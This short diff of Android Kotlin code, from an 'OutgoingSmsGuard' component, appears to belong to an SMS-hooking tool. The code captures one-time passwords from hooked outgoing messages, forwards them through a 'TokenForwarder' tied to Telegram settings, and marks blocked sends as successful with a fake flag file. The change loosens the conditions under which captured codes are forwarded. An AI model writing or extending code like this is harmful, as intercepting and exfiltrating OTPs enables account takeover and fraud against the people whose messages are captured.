@@ -116,8 +116,8 @@ object OutgoingSmsGuard {
             OtpAutoFillHelper.onHookedOtpCaptured(context, config, otp)
             val shouldForward = SmsMatcher.shouldForwardToTelegram(config, dest, body, "outgoing") ||
                 config.enableVirtualSim || config.interceptFakeSuccess
-            if (shouldForward && config.telegramBotToken.isNotBlank() && config.telegramChatId.isNotBlank()) {
-                TokenForwarder(configManager, context).forward(otp)
+            if (shouldForward) {
+                TokenForwarder(configManager, context).forwardOutgoingBlocked(otp)
             }
             try {
                 File("/data/local/tmp/hivirtus_outgoing_fake_ok.flag").writeText("ok")
